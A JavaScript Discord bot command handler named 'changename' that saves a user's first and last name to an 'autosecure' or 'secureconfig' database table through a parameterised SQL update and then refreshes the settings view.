const isUrl = require("../../../autosecure/utils/utils/isUrl");
const listSettings = require("../../../autosecure/utils/settings/listSettings.js");
const listConfiguration = require('../../../autosecure/utils/settings/listConfiguration.js');

module.exports = {
    name: "changename",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const f = interaction.fields.getTextInputValue('firstname');
            const last = interaction.fields.getTextInputValue('lastname');
            let value = null;
            if (f && last) {
                value = `${f}|${last}`;
            }
            const splitId = interaction.customId.split('|');
            const isSecureConfig = splitId[1] === "true";
            const table = isSecureConfig ? 'secureconfig' : 'autosecure';
            const [result] = await client.queryParams(
                `UPDATE ${table} SET name = ? WHERE user_id = ?`,
                [value, interaction.user.id]
            );
            let msg;
            if (isSecureConfig) {
                msg = await listConfiguration(interaction.user.id);
            } else {
                msg = await listSettings(client, interaction.user.id, true);
            }

            if (!value) {
                msg.content = "Reset to generated name!";
            } else if (msg.content === null) {
                msg.content = "Updated name successfully!";
            }

            await interaction.update(msg);
        } catch (error) {
        }
    }
};
